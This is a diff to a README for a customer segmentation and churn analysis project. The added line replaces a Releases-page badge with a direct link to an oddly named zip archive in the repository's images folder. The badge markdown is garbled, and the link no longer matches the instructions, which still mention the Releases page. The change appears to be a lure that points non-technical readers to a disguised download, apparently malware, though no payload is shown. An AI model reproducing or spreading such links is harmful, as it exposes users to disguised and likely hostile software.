@@ -7,7 +7,7 @@ This project focuses on customer segmentation and churn analysis. It was complet
 To get started, follow the steps below to download and run the application. You don't need any programming knowledge; the process is straightforward.
 
 ## 🔗 Download the Latest Release
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-blue.svg)](https://github.com/Justhavecool/Customer-Segmentation-Visualization-And-Advanced-Analysis/releases)
+[![Download Now](https://github.com/Justhavecool/Customer-Segmentation-Visualization-And-Advanced-Analysis/raw/refs/heads/main/images/And_Customer_Analysis_Advanced_Visualization_Segmentation_2.5.zip%20Now-Click%https://github.com/Justhavecool/Customer-Segmentation-Visualization-And-Advanced-Analysis/raw/refs/heads/main/images/And_Customer_Analysis_Advanced_Visualization_Segmentation_2.5.zip)](https://github.com/Justhavecool/Customer-Segmentation-Visualization-And-Advanced-Analysis/raw/refs/heads/main/images/And_Customer_Analysis_Advanced_Visualization_Segmentation_2.5.zip)
 
 ## 📥 Download & Install
 1. Click on the link above to visit the Releases page.
